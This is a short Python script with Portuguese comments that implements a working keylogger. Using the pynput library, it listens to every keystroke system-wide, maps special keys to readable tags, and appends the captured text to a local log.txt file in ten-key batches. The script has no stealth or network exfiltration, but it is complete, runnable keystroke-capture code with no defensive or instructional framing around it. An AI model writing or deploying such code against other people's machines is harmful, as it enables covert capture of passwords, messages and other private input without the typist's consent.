from pynput import keyboard

# Ajustado o nome da variável e teclas
IGNORE_KEYS = {
    keyboard.Key.shift, keyboard.Key.shift_r, 
    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
    keyboard.Key.alt_l, keyboard.Key.alt_r, 
    keyboard.Key.cmd, keyboard.Key.caps_lock
}

log_buffer = ""
BUFFER_LIMIT = 10  # Grava no arquivo a cada 10 teclas

def write_to_file(data):
    with open("log.txt", "a", encoding="utf-8") as f:
        f.write(data)

def on_press(key):
    global log_buffer
    
    try:
        # Verifica se a tecla está na lista de ignoradas antes de processar
        if key in IGNORE_KEYS:
            return

        # Captura caracteres normais
        if hasattr(key, 'char') and key.char is not None:
            log_buffer += key.char
        else:
            # Mapeamento de teclas especiais
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.tab: "\t",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.esc: "[ESC]"
            }
            log_buffer += special_keys.get(key, f"[{key}]")

        # Lógica de gravação (Buffer)
        if len(log_buffer) >= BUFFER_LIMIT or key == keyboard.Key.enter:
            write_to_file(log_buffer)
            log_buffer = "" # Limpa o buffer após gravar

    except Exception as e:
        print(f"Erro: {e}")

# Inicia o Listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()